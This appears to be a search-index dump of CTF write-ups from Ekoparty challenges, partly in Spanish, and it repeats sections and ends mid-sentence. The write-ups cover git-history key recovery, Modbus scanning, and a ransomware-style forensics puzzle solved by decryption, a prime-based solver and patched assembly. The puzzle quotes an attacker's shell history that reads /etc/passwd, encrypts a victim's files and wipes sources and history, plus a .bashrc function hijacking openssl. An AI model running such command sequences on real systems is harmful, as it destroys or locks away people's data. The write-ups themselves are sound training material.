Data"},{"location":"ctfs/main_ekoparty_2020/leak/#solution","text":"Unfortunately, by the time I\u2019m writing this writeup, both repositories were not longer available. The challenge started by pointing you out to a repository . After doing a clone I began to analyze the repo. I started the anlysis by inspecting the commits and its messages, by executing a git log : The message of commit c21... seemed to be interesting so I executed a diff against the previous one: $>git diff fd5c9927bb9f5ee3e4c521def43d3033ae83b825 c21dbf5185a4dbdb5b2bd2f3d1d3b266c3a2271e The answer was: Nice! Seemes that a ssh private key was removed. I tried to recover it: $> git checkout fd5c9927bb9f5ee3e4c521def43d3033ae83b825 $> cd .ssh/ $> head -n 3 id_rsa $> cat id_rsa.pub That public key had something weird. Usually the last part of it is just a reference (optional) to the user@host where the private key lives. However, that host seemed weird. In fact, seems to be base64 encoded. $> echo RUtPezc0NGFkN2ZlOGU2Y2U1ZTg4NWFkMjRlZWYyNDNiMWZkMTFkMGZiN2V9 | base64 -d EKO{744ad7fe8e6ce5e885ad24eef243b1fd11d0fb7e}","title":"Solution"},{"location":"ctfs/main_ekoparty_2020/mod/","text":"Challenge Data Name : Mod Category : Misc Points : 473/500 Description : \"Can you tell us what is the product running in this sofware from Area 43?\" mod.eko.cap.tf port 502 Solution I did an Nmap against this server at that port and figured it out that was running some service which was capable of talking the MODBUS protocol. I've never dealt with this kind of protocol/services so I have to start looking for information about it in Google. I downloaded/use several tools: * modpoll * Metasploit module for modbus * [pymodbus] (https://pymodbus.readthedocs.io/en/latest/readme.html) * modbus-cli All of them always raised me errors: I continued looking for more info/tool, until I found one that gave me the answer I was looking for :). Thanks: plcscan","title":"Mod"},{"location":"ctfs/main_ekoparty_2020/mod/#challenge-data","text":"Name : Mod Category : Misc Points : 473/500 Description : \"Can you tell us what is the product running in this sofware from Area 43?\" mod.eko.cap.tf port 502","title":"Challenge Data"},{"location":"ctfs/main_ekoparty_2020/mod/#solution","text":"I did an Nmap against this server at that port and figured it out that was running some service which was capable of talking the MODBUS protocol. I've never dealt with this kind of protocol/services so I have to start looking for information about it in Google. I downloaded/use several tools: * modpoll * Metasploit module for modbus * [pymodbus] (https://pymodbus.readthedocs.io/en/latest/readme.html) * modbus-cli All of them always raised me errors: I continued looking for more info/tool, until I found one that gave me the answer I was looking for :). Thanks: plcscan","title":"Solution"},{"location":"ctfs/own/eko2017/kidnapped/","text":"Coming Soon..","title":"Kidnapped"},{"location":"ctfs/own/eko2017/kidnapped/#coming-soon","text":"","title":"Coming Soon.."},{"location":"ctfs/own/eko2018/kidnapped_revenge/","text":"Kidnapped Category: Miscellaneous Points: 500/500 Enunciado Parece un chiste.. El a\u00f1o pasado me hicieron lo mismo. Me queda tiempo hasta el 28 de septiembre para entregar un trabajo de la misma materia (que recurs\u00e9 ya que nadie pudo ayudarme el a\u00f1o pasado) \"Programaci\u00f3n en assembler\". Ya estoy empezando a sospechar que alguno de ustedes me quiere hacer pasar muchos malos momentos. En fin.. me pas\u00f3 algo muy parecido al a\u00f1o pasado. Hab\u00eda terminado con el trabajo, estaba por hacer un backup, cuando de repente.. mi pc se volvi\u00f3 loca. Aparecieron archivos, archivos mios se borraron, ahora hay archivos con extensiones \".enc\" ... no entiendo nada. Por favor, dame una mano con esto. Necesito de una vez por todas terminar esta materia. El que me hizo esto, me dej\u00f3 una nota.. Capaz eso les ayuda? Les dejo un pedazo (fijense que pesa solo 15 MB, osea no trabajen sobre esa imagen porque se van a quedar sin lugar) de mi disco. Espero que les sirva de algo. Gracias File disk img Parte 1: Desencriptando files El challenge simplemente provee una imagen de un disco. Por lo tanto, montemos esta imagen: sudo mount -o rw file.img /mnt/challenge Ejecutemos un ls -R para ver que files interesantes tenemos: Parece ser un home directory de alguna distribuci\u00f3n de Linux. Adem\u00e1s, de las carpetas por defecto, parece ser que s\u00f3lo 3 files son interesantes: play_for_the_key.enc tarea_secuestrada.asm.zip.enc nota La nota, dice: No es f\u00e1cil terminar esta materia... te habr\u00e1s dado cuenta.. pensaste que como ya te hab\u00eda pasado el a\u00f1o pasado este a\u00f1o no te iba a volver a pasar? jaj, pobre. Consejo de amigos... aprend\u00e9 un poco m\u00e1s a proteger tu pc... El a\u00f1o pasado te ayud\u00e9 bastante.. este a\u00f1o.. estas solito.. solo un consejo te voy a dar si queres volver a obtener tu tarea: \"Hay veces, que romper es mucho m\u00e1s dificil que aprender a jugar\". Espero que sepas darte cuenta cuando haya que aplicar este principio. Mucha suerte.. Ah, casi me olvidaba, te volv\u00ed a modificar un poco tu tarea asique.. vas a tener que arreglarla otra vez.. Saludos Lo \u00fanico interesante ac\u00e1 parece ser la frase: \"Hay veces, que romper es mucho m\u00e1s dificil que aprender a jugar\" . Igulamente por ahora, no parece ser \u00fatil. Usando el comando ls , no vamos a listar los archivos ocultos. Si usamos el flag \"-a\" vamos a encontrar en el home, un file bastante interesante, el bash_history con el siguiente contenido: whoami cd Desktop/ ls cat /etc/passwd sudo su - cd /home/ su - eldiegomaradona su - elcharliedelapeople crontab -e cd /home/alumno/ cd facu/ cd programacion_assembler/ cd tarea_final/ vim play_for_key.c movcc play_for_key -o play_for_key vim simd.asm zip -er tarea_secuestrada.asm.zip simd.asm rm -rf simd.asm play_for_key.c openssl enc -aes-256-cbc -in tarea_secuestrada.asm.zip -out tarea_secuestrada.asm.zip.enc openssl enc -aes-256-cbc -in play_for_key -out play_for_key.enc rm -rf play_for_key rm -rf tarea_secuestrada.asm.zip vim nota cd ~ rm .bash* logout Por lo que vemos, el atacante: Trat\u00f3 de loguearse con algunos usuarios. Abri\u00f3 el file de configuraci\u00f3n de los crons, habr\u00e1 modificado algo? (no tenemos nada para confirmarlo). Cre\u00f3/edit\u00f3 un file llamado play_for_key.c ( vim play_for_the_key.c ). Lo compilo? Con algo raro? ( movcc play_for_key -o play_for_key ). Cre\u00f3/edit\u00f3 un file llamado simd.asm, ser\u00e1 la tarea? ( vim simd.asm ) . Zipea el file con password, y ac\u00e1 podemos confirmar que es la tarea ( zip -er tarea_secuestrada.asm.zip simd.asm ). Elimina los files con c\u00f3digo fuente ( rm -rf simd.asm play_for_key.c ). Encripta ambos files, sin proporcionar password! ( ambas lineas de openssl ) Elimina dicho files, es decir, s\u00f3lo deja los encriptados ( ambas lineas de rm ) Elimina todo los files que comiencen con .bash ( rm .bash ) Si tratamos de desencriptar los files de extensi\u00f3n .enc, no vamos a poder ya que nos pide una password. Dado que en los comandos para encriptar los files no se utiliz\u00f3 el flag \"-k\" , para especificar la password en el comando propiamente, entonces podemos asumir que la password fue ingresada en modo interactivo, y por lo tanto no va a haber registro de ella. Una de las posibilidades ac\u00e1 seria tratar de bruteforcear la password... Pero en general, al menos desde mi punto de vista, yo har\u00eda esto cuando se me acaban las opciones. En este caso, podemos ver que se borraron varios archivos. Por lo tanto, podr\u00edamos usar alguna suite de forensia con el objetivo de recuperar los files eliminados, como por ejemplo, photorec . Con photorec, se puede recuperar al menos un archivo. Ese archivo, parece ser el .bashrc del usuario, y entre sus l\u00edneas, tiene lo siguiente: # enable some nice features openssl(){ ba=$4 /usr/bin/openssl $1 $2 $3 $4 $5 $6 -k $(for i in {1..100}; do echo -n ${#ba}; done) } Esto quiere decir que, basicamente, el atacante cre\u00f3 un alias con el mismo nombre que el comando openssl , redefiniendo su acci\u00f3n. En resumen, lo que esta haciendo eso, es agregar la password de encripci\u00f3n con el flag \"-k\" cada vez que se llama al comando openssl . Dicha password es la longitud del nombre del file pasado por par\u00e1metro, repetido 100 veces. La longitud del string play_for_the_key es 16 y de tarea_secuestrada.asm.zip es 25. Por lo tanto, los siguientes comandos, vamos a poder desencriptar ambos files: /usr/bin/openssl enc -d -aes-256-cbc -in tarea_secuestrada.asm.zip.enc -out tarea_secuestrada.asm.zip -k 25252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525 /usr/bin/openssl enc -d -aes-256-cbc -in play_for_the_key.enc -out play_for_the_key -k 16161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616 Tener que la salida de estos comandos deber\u00eda ser almacenada afuera del disco, ya que s\u00f3lo tiene 15 MB Parte 2: Jugar, a veces es m\u00e1s facil En este momento tenemos 2 files imporatantes: * play_for_the_key : Un binario de 32 bits. Que cuando lo ejecutamos parece que nos pide respuestas a unas \"preguntas\". * tarea_secuestrada.zip : Un archivo ZIP con password. En este momento uno podr\u00eda tratar de bruteforcear la password del ZIP quiz\u00e1s usando JTR o Hashcat o cualquier otra tool para crackear password de un ZIP. Pero, dado que existe un binario con un nombre bastante claro, se puede intuir que el camino al menos l\u00f3gico, ser\u00eda tratar de conseguir la key usando dicho binario. Play for the key Cuando ejecutamos el binario, el siguiente mensaje aparece: Ingresa la respuesta n\u00famero 1: A esta altura no tenemos ni idea que significa esto. Si empezamos a probar y fallamos, el mensaje \"Nop!\" se imprimir\u00e1 en la pantalla. En cambio, si ponemos la respuesta correcta, nos pedir\u00e1 la respuesta a la siguiente pregunta: Pero \u00bfC\u00f3mo sabemos cuantas pregunta son? \u00bfCu\u00e1l es la repuesta correcta? Una opci\u00f3n v\u00e1lida en este momento ser\u00eda tratar de reversear el binario y ver qu\u00e9 est\u00e1 haciendo. Para este ejemplo, voy a usar Binary Ninja . Sin embargo, cuando vamos a ver el graph view del binario, vemos algo bastante extra\u00f1o.. Solo existe un basic block. Si seguimos mirando, vamos a notar que s\u00f3lo hay instrucciones MOV : \u00bfQu\u00e9 est\u00e1 pasando?. Si volvemos atr\u00e1s un poco y revisamos otra vez el bash_history vamos a darnos cuenta que este binario fue compilado usando un comando llamado movcc . El primer resultado de la b\u00fasqueda de dicho comando en Google, nos lleva a un github de una tool llamada movfuscator . Seg\u00fan su documentaci\u00f3n, esta compila un c\u00f3digo fuente en un binario de s\u00f3lo instrucciones MOV . Si bien desde un punto de performance y hasta de espacio que ocupa dicho binario, es bastante malo, al estar escrito s\u00f3lo con instrucciones MOV el reversing de este binario se vuelve muchisimo m\u00e1s tedioso. Y aqu\u00ed se abren dos caminos: 1. Encontramos una tool para de-movfuscar el binario. 2. Hacemos uso del msj de la nota, y JUGAMOS en vez de tratar de romper el juego. Vamos a ir por la opci\u00f3n 2: Luego de probar un poco con algunos valores que ingresamos como respuestas, vamos a notar que: 1. Para 1, la respuesta es 1. 2. Para 2, la respuesta es 2. 3. Para 3, la respuesta es 1. 4. Para 4, la respuesta es 1. 5. Para 5, la respuesta es 2. 6. Para 6, la respuesta es 1. 7. Para 7, la respuesta es 2. 8. Para 8, la respuesta es 1. 9. Para 9, la respuesta es 2. 10. Para 10, la respuesta es 3. 11. Para 11, la respuesta es 4. 12. Para 12, la respuesta es 1. Si observamos con detalle, podemos ver que el la respuesta es un numero que empieza a aumentar pero en ciertos valores vuelve a uno. Dichos valores son: 2, 3, 5, 7, 11, etc. Es decir, parece ser un contador que cuando el n\u00famero de la pregunta es uno de esos, el contador se resetea y vuelve a empezar de 1. Pero \u00bfQu\u00e9 tienen de com\u00fan estos n\u00fameros? SON PRIMOS!! Todav\u00eda no sabemos qu\u00e9 cantidad de preguntas hay, pero igualmente, podemos hacer un script que imprima un contador y que cada vez que se cruza con un n\u00famero primo, vuelva a 1. Dado que no sabemos la cantidad, podemos ir probando hasta que la encontremos. Yo arranqu\u00e9 con 15, y faltaban mas. Mi siguiente paso fue probar con 1000, y funcion\u00f3. La cantidad de preguntas finalmente eran 100. Solucionador primos = [] contador = 1 numero_de_pregunta = 1 posible_numero_de_preguntas = 1000 for numero_de_pregunta in xrange(1,posible_numero_de_preguntas): print contador if any((numero_de_pregunta % primo) == 0 for primo in primos) or numero_de_pregunta == 1: contador += 1 else: contador = 1 primos.append(numero_de_pregunta) Intento con 15 primos Intento con 1000 primos Si intentamos descomprimir el ZIP con esa clave, vamos a obtener un \u00faltimo file simd.asm , que es la \u00faltima parte del challenge. Parte 3: Programaci\u00f3n en assembler La \u00faltima parte del challenge implica tratar de entender qu\u00e9 hizo el atacante (qu\u00e9 modific\u00f3) para poder volver hacer que funcione otra vez. El file original contiene: nasm -f elf64 simd.asm; ld -o simd simd.o section .text global _start _start: movdqu xmm1, [Parallel_processing] movdqu xmm3, [is_much_faster...You_know?] movdqu xmm5, [but_sometimes_is_difficult] movdqu xmm7, [to_understand_how_it_works.] movdqu xmm10, [Anyways_I_trust_you...] movdqu xmm2, xmm1 movdqu xmm4, xmm3 movdqu xmm6, xmm5 movdqu xmm8, xmm7 movdqu xmm11, xmm10 pxor xmm9, xmm9 punpckhwd xmm1, xmm9 punpckhwd xmm2, xmm9 punpcklwd xmm3, xmm9 punpckhwd xmm4, xmm9 punpcklwd xmm5, xmm9 punpcklwd xmm6, xmm9 punpcklwd xmm7, xmm9 punpckhwd xmm8, xmm9 punpcklwd xmm10, xmm9 punpckhwd xmm9 ,xmm11 psubw xmm1, xmm10 psubw xmm2, xmm11 psubw xmm3, xmm10 psubw xmm4, xmm11 psubw xmm5, xmm10 psubw xmm6, xmm11 psubw xmm7, xmm10 psubw xmm8, xmm11 packuswb xmm1, xmm2 packuswb xmm3, xmm4 packuswb xmm5, xmm6 packuswb xmm7, xmm8 movdqu [Parallel_processing], xmm1 movdqu [is_much_faster...You_know?], xmm3 movdqu [but_sometimes_is_difficult], xmm5 movdqu [to_understand_how_it_works.], xmm7 mov ecx, Parallel_processing mov edx, 0x40 mov ebx,1 mov eax,4 int 0x80 mov eax,1 int 0x80 section .data Parallel_processing dq 0x7e7618131b332312, 0xb5db2d5e4333690e is_much_faster...You_know? dq 0x487bdfe02d301eee, 0x9db0232038f9321e but_sometimes_is_difficult dq 0x4a47dbdf5e07f2f5, 0x6caaef1f3ef1312f to_understand_how_it_works. dq 0x5078dd0e61071ff0, 0x5a9adf0f28e0206b Anyways_I_trust_you... dq 0x1715ABADFACEBABE Whats_wrong_in_this_code? dq 0x3A7ABEEF08C0FFEE Lo m\u00e1s imporante ac\u00e1 es entender qu\u00e9 est\u00e1 haciendo este c\u00f3digo, al menos una idea a alto nivel para despu\u00e9s ahondar en cada detalle. Dividamos el c\u00f3digo en partes: An\u00e1lisis de c\u00f3digo - Parte 1 movdqu xmm1, [Parallel_processing] movdqu xmm3, [is_much_faster...You_know?] movdqu xmm5, [but_sometimes_is_difficult] movdqu xmm7, [to_understand_how_it_works.] movdqu xmm10, [Anyways_I_trust_you...] movdqu xmm2, xmm1 movdqu xmm4, xmm3 movdqu xmm6, xmm5 movdqu xmm8, xmm7 movdqu xmm11, xmm10 pxor xmm9, xmm9 En esta parte, simplemente est\u00e1 copiando el contenido de las etiquetas a los registros XMM (16 bytes). Luego, hace una de cada una de ellos, dejando el mismo contenido de a pares. Es decir, xmm1 tiene el mismo valor que xmm2 , xmm3 el mismo que xmm4 , etc.. Por \u00faltimo, xmm9 lo pone en 0. An\u00e1lisis de c\u00f3digo - Parte 2 punpckhwd xmm1, xmm9 punpckhwd xmm2, xmm9 punpcklwd xmm3, xmm9 punpckhwd xmm4, xmm9 punpcklwd xmm5, xmm9 punpcklwd xmm6, xmm9 punpcklwd xmm7, xmm9 punpckhwd xmm8, xmm9 punpcklwd xmm10, xmm9 punpckhwd xmm9 ,xmm11 En esta segunda parte, se puede observar dos instrucciones distintas: * punpckhwd * punpcklwd \u00c9stas, son parte de un conjunto de instrucciones (SSE) usados para procesamiento paralelo. Googleando un poco, se puede encontrar que la funci\u00f3n punpckhwd divide los registros, tanto fuente como destino, en words (2 bytes) (por eso la ante \u00faltima letra, w ). Toma las words que est\u00e1n en la parte high (por eso la letra h antes de la w ) de ambos registros, y los intercala. Lo imporante de esta parte, no es tanto entrar en detalle de c\u00f3mo es que se intercalan estrictamente, sino m\u00e1s que nada entender que: Se est\u00e1 unpackeando words Se est\u00e1 unpackeando o bien la parte high, o bien la parte low. Casi todas ellas se est\u00e1n unpackeando con 0 ( xmm9 es 0). Si recordamos lo que se hizo en la primera parte, hab\u00eda pares de registros xmm que tenian el mismo valor. Si bien vemos casos en la parte 2, donde se est\u00e1 unpackeando la parte high y low de un mismo valor de registros (por ejemplo, para xmm3 y xmm4 ), tambi\u00e9n vemos casos donde se hace dos veces la parte high ( xmm1 y xmm2 ). Raro.. Adem\u00e1s, vemos que la \u00faltima intrucci\u00f3n, parece unpackear al rev\u00e9s, es decir, usando el xmm9 como registro fuente y no como destino. Otra cosa para anotar. An\u00e1lisis de c\u00f3digo - Parte 3 psubw xmm1, xmm10 psubw xmm2, xmm11 psubw xmm3, xmm10 psubw xmm4, xmm11 psubw xmm5, xmm10 psubw xmm6, xmm11 psubw xmm7, xmm10 psubw xmm8, xmm11 Otra instrucci\u00f3n del mismo set de procesamiento paralelo. En este caso esta instrucci\u00f3n hace una resta word a word de cada registro y almacena el resultado en el registro destino. Obsevado este pedazo de c\u00f3digo, se puede intuir que ni xmm11 ni xmm10 son usados dos veces con el mismo par de registros. Es decir, todo par de registros usa una vez xmm10 y una vez xmm11 . De hecho, por el orden y lo n\u00fameros de regitros, podr\u00edamos llegar a pensar que xmm10 es siempre usado para la parte low de los pares de registros y xmm11 para la parte high . An\u00e1lisis de c\u00f3digo - Parte 4 packuswb xmm1, xmm2 packuswb xmm3, xmm4 packuswb xmm5, xmm6 packuswb xmm7, xmm8 Por \u00faltimo, en esta parte, se hace el packeo otra vez para volver a la \"normalidad\". Cada par de registros, se packean juntos. Sin embargo, dicho packeo, se hace de word a byte (por eso wb a lo \u00faltimo) cuando el unpackeo se hizo de word a double word... raro.. An\u00e1lisis de c\u00f3digo - Parte 5 movdqu [Parallel_processing], xmm1 movdqu [is_much_faster...You_know?], xmm3 movdqu [but_sometimes_is_difficult], xmm5 movdqu [to_understand_how_it_works.], xmm7 Se escribe dichas posiciones de memoria el valor que tienen algunos (los representantes de cada par?) de los xmm despu\u00e9s de hacer las operaciones. An\u00e1lisis de c\u00f3digo - Parte 6 mov ecx, Parallel_processing mov edx, 0x40 mov ebx,1 mov eax,4 int 0x80 mov eax,1 int 0x80 Finalmente, imprime por pantalla los 64 bytes que tenga la posici\u00f3n de memoria apuntada por la etiqueta Parallel_processing . An\u00e1lisis de c\u00f3digo - Resumen Hay al menos 3 cosas que parecen raras: En el momemto de unpackear, hay algunos pares de registros que se unpackea la misma parte (high o low). En una instrucci\u00f3n de unpackeo, se usa el xmm9 como registro destino (no consistente con todo lo anterior). En el momento de packear, si bien se hab\u00eda unpackeado de word a double word, se packea de word a byte. Al ser un ejercicio de \"patching\", no queda otra que ir probando los cambios a ver como afectan. Igualmente, as\u00ed como fuimos intuyendo a lo largo del texto, podr\u00edamos hacer los cambios para l\u00f3gicos: Cada par deberia unpackear la parte low y la parte high. C\u00f3mo saber cual deber\u00eda, podr\u00edamos probar. Sin embargo, por c\u00f3mo est\u00e1 escrito el c\u00f3digo, vamos a optar por unpackear la parte low con el registro de numero m\u00e1s bajo entre los pares (es decir, entre xmm1 y xmm2 , usaremos xmm1 ) y el de n\u00famero m\u00e1s alto para la parte high: punpcklwd xmm1, xmm9 punpckhwd xmm2, xmm9 punpcklwd xmm3, xmm9 punpckhwd xmm4, xmm9 punpcklwd xmm5, xmm9 punpckhwd xmm6, xmm9 punpcklwd xmm7, xmm9 punpckhwd xmm8, xmm9 punpcklwd xmm10, xmm9 punpckhwd xmm11, xmm9 xmm9 no tiene mucho sentido ponerlo adelante, adem\u00e1s de que parece inconsistente con todas las otras, por lo tanto, cambiemos el orden. y dejemos que la instrucci\u00f3n sea: punpckhwd xmm11, xmm9 Probemos. Packemos de double word a word, usando la instrucci\u00f3n packusdw : packusdw xmm1, xmm2 packusdw xmm3, xmm4 packusdw xmm5, xmm6 packusdw xmm7, xmm8 Es decir, que finalmente, el nuevo c\u00f3digo ser\u00eda: ; nasm -f elf64 simd.asm; ld -o simd simd.o section .text global _start _start: movdqu xmm1, [Parallel_processing] movdqu xmm3, [is_much_faster...You_know?] movdqu xmm5, [but_sometimes_is_difficult] movdqu xmm7, [to_understand_how_it_works.] movdqu xmm10, [Anyways_I_trust_you...] movdqu xmm2, xmm1 movdqu xmm4, xmm3 movdqu xmm6, xmm5 movdqu xmm8, xmm7 movdqu xmm11, xmm10 pxor xmm9, xmm9 punpcklwd xmm1, xmm9 punpckhwd xmm2, xmm9 punpcklwd xmm3, xmm9 punpckhwd xmm4, xmm9 punpcklwd xmm5, xmm9 punpckhwd xmm6, xmm9 punpcklwd xmm7, xmm9 punpckhwd xmm8, xmm9 punpcklwd xmm10, xmm9 punpckhwd xmm11, xmm9 psubw xmm1, xmm10 psubw xmm2, xmm11 psubw xmm3, xmm10 psubw xmm4, xmm11 psubw xmm5, xmm10 psubw xmm6, xmm11 psubw xmm7, xmm10 psubw xmm8, xmm11 packusdw xmm1, xmm2 packusdw xmm3, xmm4 packusdw xmm5, xmm6 packusdw xmm7, xmm8 movdqu [Parallel_processing], xmm1 movdqu [is_much_faster...You_know?], xmm3 movdqu [but_sometimes_is_difficult], xmm5 movdqu [to_understand_how_it_works.], xmm7 mov ecx, Parallel_processing mov edx, 0x40 mov ebx,1 mov eax,4 int 0x80 mov eax,1 int 0x80 section .data Parallel_processing dq 0x7e7618131b332312, 0xb5db2d5e4333690e is_much_faster...You_know? dq 0x487bdfe02d301eee, 0x9db0232038f9321e but_sometimes_is_difficult dq 0x4a47dbdf5e07f2f5, 0x6caaef1f3ef1312f to_understand_how_it_works. dq 0x5078dd0e61071ff0, 0x5a9adf0f28e0206b Anyways_I_trust_you... dq 0x1715ABADFACEBABE Whats_wrong_in_this_code? dq 0x3A7ABEEF08C0FFEE Si compilamos este programa y lo corremos, obtendremos el flag: The flag is:ona{0db234f102901d6c789c2023A11600022e9fa1c9}","title":"Kidnapped the Revenge"},{"location":"ctfs/own/eko2018/kidnapped_revenge/#kidnapped","text":"Category: Miscellaneous Points: 500/500","title":"Kidnapped"},{"location":"ctfs/own/eko2018/kidnapped_revenge/#enunciado","text":"Parece un chiste.. El a\u00f1o pasado me hicieron lo mismo. Me queda tiempo hasta el 28 de septiembre para entregar un trabajo de la misma materia (que recurs\u00e9 ya que nadie pudo ayudarme el a\u00f1o pasado) \"Programaci\u00f3n en assembler\". Ya estoy empezando a sospechar que alguno de ustedes me quiere hacer pasar muchos malos momentos. En fin.. me pas\u00f3 algo muy parecido al a\u00f1o pasado. Hab\u00eda terminado con el trabajo, estaba por hacer un backup, cuando de repente.. mi pc se volvi\u00f3 loca. Aparecieron archivos, archivos mios se borraron, ahora hay archivos con extensiones \".enc\" ... no entiendo nada. Por favor, dame una mano con esto. Necesito de una vez por todas terminar esta materia. El que me hizo esto, me dej\u00f3 una nota.. Capaz eso les ayuda? Les dejo un pedazo (fijense que pesa solo 15 MB, osea no trabajen sobre esa imagen porque se van a quedar sin lugar) de mi disco. Espero que les sirva de algo. Gracias","title":"Enunciado"},{"location":"ctfs/own/eko2018/kidnapped_revenge/#file","text":"disk img","title":"File"},{"location":"ctfs/own/eko2018/kidnapped_revenge/#parte-1-desencriptando-files","text":"El challenge simplemente provee una imagen de un disco. Por lo tanto, montemos esta imagen: sudo mount -o rw file.img /mnt/challenge Ejecutemos un ls -R para ver que files interesantes tenemos: Parece ser un home directory de alguna distribuci\u00f3n de Linux. Adem\u00e1s, de las carpetas por defecto, parece ser que s\u00f3lo 3 files son interesantes: play_for_the_key.enc tarea_secuestrada.asm.zip.enc nota La nota, dice: No es f\u00e1cil terminar esta materia... te habr\u00e1s dado cuenta.. pensaste que como ya te hab\u00eda pasado el a\u00f1o pasado este a\u00f1o no te iba a volver a pasar? jaj, pobre. Consejo de amigos... aprend\u00e9 un poco m\u00e1s a proteger tu pc... El a\u00f1o pasado te ayud\u00e9 bastante.. este a\u00f1o.. estas solito.. solo un consejo te voy a dar si queres volver a obtener tu tarea: \"Hay veces, que romper es mucho m\u00e1s dificil que aprender a jugar\". Espero que sepas darte cuenta cuando haya que aplicar este principio. Mucha suerte.. Ah, casi me olvidaba, te volv\u00ed a modificar un poco tu tarea asique.. vas a tener que arreglarla otra vez.. Saludos Lo \u00fanico interesante ac\u00e1 parece ser la frase: \"Hay veces, que romper es mucho m\u00e1s dificil que aprender a jugar\" . Igulamente por ahora, no parece ser \u00fatil. Usando el comando ls , no vamos a listar los archivos ocultos. Si usamos el flag \"-a\" vamos a encontrar en el home, un file bastante interesante, el bash_history con el siguiente contenido: whoami cd Desktop/ ls cat /etc/passwd sudo su - cd /home/ su - eldiegomaradona su - elcharliedelapeople crontab -e cd /home/alumno/ cd facu/ cd programacion_assembler/ cd tarea_final/ vim play_for_key.c movcc play_for_key -o play_for_key vim simd.asm zip -er tarea_secuestrada.asm.zip simd.asm rm -rf simd.asm play_for_key.c openssl enc -aes-256-cbc -in tarea_secuestrada.asm.zip -out tarea_secuestrada.asm.zip.enc openssl enc -aes-256-cbc -in play_for_key -out play_for_key.enc rm -rf play_for_key rm -rf tarea_secuestrada.asm.zip vim nota cd ~ rm .bash* logout Por lo que vemos, el atacante: Trat\u00f3 de loguearse con algunos usuarios. Abri\u00f3 el file de configuraci\u00f3n de los crons, habr\u00e1 modificado algo? (no tenemos nada para confirmarlo). Cre\u00f3/edit\u00f3 un file llamado play_for_key.c ( vim play_for_the_key.c ). Lo compilo? Con algo raro? ( movcc play_for_key -o play_for_key ). Cre\u00f3/edit\u00f3 un file llamado simd.asm, ser\u00e1 la tarea? ( vim simd.asm ) . Zipea el file con password, y ac\u00e1 podemos confirmar que es la tarea ( zip -er tarea_secuestrada.asm.zip simd.asm ). Elimina los files con c\u00f3digo fuente ( rm -rf simd.asm play_for_key.c ). Encripta ambos files, sin proporcionar password! ( ambas lineas de openssl ) Elimina dicho files, es decir, s\u00f3lo deja los encriptados ( ambas lineas de rm ) Elimina todo los files que comiencen con .bash ( rm .bash ) Si tratamos de desencriptar los files de extensi\u00f3n .enc, no vamos a poder ya que nos pide una password. Dado que en los comandos para encriptar los files no se utiliz\u00f3 el flag \"-k\" , para especificar la password en el comando propiamente, entonces podemos asumir que la password fue ingresada en modo interactivo, y por lo tanto no va a haber registro de ella. Una de las posibilidades ac\u00e1 seria tratar de bruteforcear la password... Pero en general, al menos desde mi punto de vista, yo har\u00eda esto cuando se me acaban las opciones. En este caso, podemos ver que se borraron varios archivos. Por lo tanto, podr\u00edamos usar alguna suite de forensia con el objetivo de recuperar los files eliminados, como por ejemplo, photorec . Con photorec, se puede recuperar al menos un archivo. Ese archivo, parece ser el .bashrc del usuario, y entre sus l\u00edneas, tiene lo siguiente: # enable some nice features openssl(){ ba=$4 /usr/bin/openssl $1 $2 $3 $4 $5 $6 -k $(for i in {1..100}; do echo -n ${#ba}; done) } Esto quiere decir que, basicamente, el atacante cre\u00f3 un alias con el mismo nombre que el comando openssl , redefiniendo su acci\u00f3n. En resumen, lo que esta haciendo eso, es agregar la password de encripci\u00f3n con el flag \"-k\" cada vez que se llama al comando openssl . Dicha password es la longitud del nombre del file pasado por par\u00e1metro, repetido 100 veces. La longitud del string play_for_the_key es 16 y de tarea_secuestrada.asm.zip es 25. Por lo tanto, los siguientes comandos, vamos a poder desencriptar ambos files: /usr/bin/openssl enc -d -aes-256-cbc -in tarea_secuestrada.asm.zip.enc -out tarea_secuestrada.asm.zip -k 25252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525 /usr/bin/openssl enc -d -aes-256-cbc -in play_for_the_key.enc -out play_for_the_key -k 16161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616 Tener que la salida de estos comandos deber\u00eda ser almacenada afuera del disco, ya que s\u00f3lo tiene 15 MB","title":"Parte 1: Desencriptando files"},{"location":"ctfs/own/eko2018/kidnapped_revenge/#parte-2-jugar-a-veces-es-mas-facil","text":"En este momento tenemos 2 files imporatantes: * play_for_the_key : Un binario de 32 bits. Que cuando lo ejecutamos parece que nos pide respuestas a unas \"preguntas\". * tarea_secuestrada.zip : Un archivo ZIP con password. En este momento uno podr\u00eda tratar de bruteforcear la password del ZIP quiz\u00e1s usando JTR o Hashcat o cualquier otra tool para crackear password de un ZIP. Pero, dado que existe un binario con un nombre bastante claro, se puede intuir que el camino al menos l\u00f3gico, ser\u00eda tratar de conseguir la key usando dicho binario.","title":"Parte 2: Jugar, a veces es m\u00e1s facil"},{"location":"ctfs/own/eko2018/kidnapped_revenge/#play-for-the-key","text":"Cuando ejecutamos el binario, el siguiente mensaje aparece: Ingresa la respuesta n\u00famero 1: A esta altura no tenemos ni idea que significa esto. Si empezamos a probar y fallamos, el mensaje \"Nop!\" se imprimir\u00e1 en la pantalla. En cambio, si ponemos la respuesta correcta, nos pedir\u00e1 la respuesta a la siguiente pregunta: Pero \u00bfC\u00f3mo sabemos cuantas pregunta son? \u00bfCu\u00e1l es la repuesta correcta? Una opci\u00f3n v\u00e1lida en este momento ser\u00eda tratar de reversear el binario y ver qu\u00e9 est\u00e1 haciendo. Para este ejemplo, voy a usar Binary Ninja . Sin embargo, cuando vamos a ver el graph view del binario, vemos algo bastante extra\u00f1o.. Solo existe un basic block. Si seguimos mirando, vamos a notar que s\u00f3lo hay instrucciones MOV : \u00bfQu\u00e9 est\u00e1 pasando?. Si volvemos atr\u00e1s un poco y revisamos otra vez el bash_history vamos a darnos cuenta que este binario fue compilado usando un comando llamado movcc . El primer resultado de la b\u00fasqueda de dicho comando en Google, nos lleva a un github de una tool llamada movfuscator . Seg\u00fan su documentaci\u00f3n, esta compila un c\u00f3digo fuente en un binario de s\u00f3lo instrucciones MOV . Si bien desde un punto de performance y hasta de espacio que ocupa dicho binario, es bastante malo, al estar escrito s\u00f3lo con instrucciones MOV el reversing de este binario se vuelve muchisimo m\u00e1s tedioso. Y aqu\u00ed se abren dos 